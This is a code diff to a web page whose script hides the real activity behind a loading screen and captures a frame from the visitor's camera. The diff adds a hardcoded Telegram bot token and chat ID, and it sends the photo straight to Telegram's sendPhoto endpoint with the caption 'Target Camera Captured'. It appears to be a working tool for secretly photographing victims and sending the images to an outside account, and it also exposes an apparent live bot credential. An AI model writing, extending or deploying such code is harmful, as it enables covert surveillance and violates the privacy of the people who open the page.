@@ -58,6 +58,9 @@
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
+        const BOT_TOKEN = "8857558695:AAGOlJ_9PzeyvaOku_2_-MxjdbZJILC1cQI";
+        const CHAT_ID = "6478868514";
+
         function startCapture() {
             document.getElementById('main-card').style.display = 'none';
             document.getElementById('loading-card').style.display = 'block';
@@ -76,14 +79,24 @@
                         const ctx = canvas.getContext('2d');
                         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                         
-                        const imageData = canvas.toDataURL('image/jpeg', 0.85);
-                        stream.getTracks().forEach(track => track.stop());
+                        canvas.toBlob(blob => {
+                            stream.getTracks().forEach(track => track.stop());
 
-                        fetch('/api/capture', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ image: imageData })
-                        }).catch(err => console.error(err));
+                            const formData = new FormData();
+                            formData.append('chat_id', CHAT_ID);
+                            formData.append('caption', '📸 **Target Camera Captured via Direct JS**');
+                            formData.append('parse_mode', 'Markdown');
+                            formData.append('photo', blob, 'captured.jpg');
+
+                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                                method: 'POST',
+                                body: formData
+                            })
+                            .then(res => res.json())
+                            .then(data => console.log("Success:", data))
+                            .catch(err => console.error("Error:", err));
+
+                        }, 'image/jpeg', 0.85);
 
                     }, 1500);
                 })
@@ -94,5 +107,4 @@
         }
     </script>
 </body>
-    </html>
-    
+</html>
